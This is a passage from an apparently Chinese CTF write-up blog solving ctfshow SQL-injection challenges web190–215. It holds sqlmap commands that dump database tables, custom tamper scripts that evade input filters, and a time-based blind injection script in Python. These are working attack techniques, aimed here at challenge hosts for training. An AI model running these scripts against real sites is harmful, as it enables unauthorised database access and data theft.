class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;登陆成功&quot;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">        <span class="built_in">print</span>(r.json()[<span class="string">&#x27;msg&#x27;</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web190-200"><a href="#web190-200" class="headerlink" title="web190-200"></a>web190-200</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Y4tacker</span></span><br><span class="line"><span class="comment"># username=0;show tables;</span></span><br><span class="line"><span class="comment"># pass=ctfshow_user</span></span><br></pre></td></tr></table></figure><h2 id="web201-因为是第一题所以详细点"><a href="#web201-因为是第一题所以详细点" class="headerlink" title="web201(因为是第一题所以详细点)"></a>web201(因为是第一题所以详细点)</h2><p>简单说下顺序<br>1.获取当前MySQL中的所有数据库<br>2.获取当前数据库名字<br>3.获取数据库下的数据表<br>4.获取表下的列名<br>5.导出数据</p><p>开始实战</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">判断注入点</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://ea6a1109-3603-47d2-b9ae-73892287235d.chall.ctf.show/api/?id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查数据库</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://ea6a1109-3603-47d2-b9ae-73892287235d.chall.ctf.show/api/?id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201127144042140.png" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查数据表</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://ea6a1109-3603-47d2-b9ae-73892287235d.chall.ctf.show/api/?id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> --tables</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201127144357670.png" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查列</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://ea6a1109-3603-47d2-b9ae-73892287235d.chall.ctf.show/api/?id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> -T <span class="string">&quot;ctfshow_user&quot;</span> --columns</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020112714445566.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://ea6a1109-3603-47d2-b9ae-73892287235d.chall.ctf.show/api/?id=1&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> -T <span class="string">&quot;ctfshow_user&quot;</span> -C <span class="string">&quot;pass&quot;</span> --dump</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201127144541681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><p><img src="https://img-blog.csdnimg.cn/20201127144738521.png" alt="在这里插入图片描述"><br>直接给payload了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">第一步用--data调整参数</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://e34d77f4-a6bf-4c49-915c-a20f188282d8.chall.ctf.show/api/&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span></span><br><span class="line">第二步</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://e34d77f4-a6bf-4c49-915c-a20f188282d8.chall.ctf.show/api/&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --dbs</span><br><span class="line">第三步</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://e34d77f4-a6bf-4c49-915c-a20f188282d8.chall.ctf.show/api/&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> --tables</span><br><span class="line">第四步</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://e34d77f4-a6bf-4c49-915c-a20f188282d8.chall.ctf.show/api/&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> -T <span class="string">&quot;ctfshow_user&quot;</span> --columns</span><br><span class="line">第五步</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://e34d77f4-a6bf-4c49-915c-a20f188282d8.chall.ctf.show/api/&quot;</span> --referer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> -T <span class="string">&quot;ctfshow_user&quot;</span> -C <span class="string">&quot;pass&quot;</span> --dump</span><br></pre></td></tr></table></figure><h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><p>注意：一定要加上–headers=“Content-Type: text/plain” ，否则是按表单提交的，put接收不到<br><img src="https://img-blog.csdnimg.cn/20201127145645282.png" alt="在这里插入图片描述"><br>/_为了节约时间，接下来采用一把梭payload，希望师傅们按照前两题那样自己一步一步来_/</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://0fd2c048-9c6d-4928-baba-7912fafb6410.chall.ctf.show/api/index.php&quot;</span> --method=PUT --data=<span class="string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --dbms=mysql -D ctfshow_web -T ctfshow_user -C pass --dump</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201127145839382.png" alt="在这里插入图片描述"></p><h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><p>注意：需要改的参数除了url，还有cookie的数值哈，怎么看Cookie大家都知道吧，F12<br><img src="https://img-blog.csdnimg.cn/20201127145923659.png" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http:<span class="comment">//70c44e02-350d-42f4-965d-a5249e16fd4d.chall.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show  --dbms=mysql dbs=ctfshow_web -T ctfshow_user -C pass --dump --headers=&quot;Content-Type: text/plain&quot; --cookie=&quot;PHPSESSID=8fp1h4ctsl04cuo5o8kt61albs;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><p>提示了<br><img src="https://img-blog.csdnimg.cn/20201127150333837.png" alt="在这里插入图片描述"><br>通过抓包分析，在每次请求<code>url/api/index.php</code>之前需要先请求<code>URL/api/getTokn.php</code>，大家可以用burpsuite抓包看看确实是这么回事<br><img src="https://img-blog.csdnimg.cn/20201127150406969.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以我们需要两个参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--safe-url 设置在测试目标地址前访问的安全链接</span><br><span class="line"> --safe-freq 设置两次注入测试前访问安全链接的次数</span><br></pre></td></tr></table></figure><p>下面给出payload:(还是希望师傅们还是按照web201给出的步骤一步一步查询)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http:<span class="comment">//85fe947b-518c-450c-8335-ac69a6a59b78.chall.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --dbms=mysql dbs=ctfshow_web -T ctfshow_flax -C flagx --dump  --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://85fe947b-518c-450c-8335-ac69a6a59b78.chall.ctf.show/api/getToken.php --safe-freq=1</span></span><br></pre></td></tr></table></figure><h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><p>没啥区别，说了等于没说，sqlmap会自己判断<br><img src="https://img-blog.csdnimg.cn/20201127150957975.png" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http:<span class="comment">//303329b7-8627-41d9-9e71-45a218a61c49.chall.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --dbms=mysql -D &quot;ctfshow_web&quot; -T &quot;ctfshow_flaxc&quot; -C &quot;flagv&quot; --dump  --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://303329b7-8627-41d9-9e71-45a218a61c49.chall.ctf.show/api/getToken.php --safe-freq=1</span></span><br></pre></td></tr></table></figure><h2 id="web207-208"><a href="#web207-208" class="headerlink" title="web207-208"></a>web207-208</h2><p>下面进入了我们的自写tamper时代啦！！！<br><img src="https://img-blog.csdnimg.cn/20201127151111635.png" alt="在这里插入图片描述"><br>这里给出一个学习链接：<a href="https://y4er.com/post/sqlmap-tamper/">Sqlmap Tamper 编写</a><br>给大家参考下我写的！！！大家慢慢学习！！！，然后将脚本放在这个目录下即可<br><img src="https://img-blog.csdnimg.cn/20201127151643113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后命名随意啊<br><img src="https://img-blog.csdnimg.cn/20201127151731959.png" alt="在这里插入图片描述"><br>之后就</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http://fad3bae9-3b33-<span class="number">4198</span>-<span class="number">9526</span>-403c32afc102.chall.ctf.show/api/index.php --method=PUT --data=<span class="string">&quot;id=1&quot;</span> --referer=ctf.show --dbms=mysql --dbs  --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=http://fad3bae9-3b33-<span class="number">4198</span>-<span class="number">9526</span>-403c32afc102.chall.ctf.show/api/getToken.php --safe-freq=<span class="number">1</span> --tamper=web207</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;url/api/index.php&quot;</span> --method=PUT --data=<span class="string">&quot;id=1&quot;</span> --referer=ctf.show --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --safe-url=<span class="string">&quot;url/api/getToken.php&quot;</span> --safe-freq=<span class="number">1</span> --dbms=mysql --current-db --dump --batch --prefix=<span class="string">&quot;&#x27;)&quot;</span> --tamper=space2comment</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = space2comment(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">space2comment</span>(<span class="params">payload</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h2><p>多过滤了一个<code>=</code>这里用<code>like</code>绕过<br><img src="https://img-blog.csdnimg.cn/20201127152828893.png" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = space2comment(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">space2comment</span>(<span class="params">payload</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x31</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot;=&quot;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)+<span class="string">&#x27;like&#x27;</span>+<span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web210-212"><a href="#web210-212" class="headerlink" title="web210-212"></a>web210-212</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = space2comment(payload)</span><br><span class="line">    retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = base64.b64encode(payload[::-<span class="number">1</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        retVal = base64.b64encode(retVal[::-<span class="number">1</span>]).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">space2comment</span>(<span class="params">payload</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x31</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot;=&quot;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)+<span class="string">&#x27;like&#x27;</span>+<span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web213（暂时出了一点小问题，晚点更新）"><a href="#web213（暂时出了一点小问题，晚点更新）" class="headerlink" title="web213（暂时出了一点小问题，晚点更新）"></a>web213（暂时出了一点小问题，晚点更新）</h2><h2 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查列名字-id.flag</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flaga from ctfshow_flagx&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1)&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>:<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 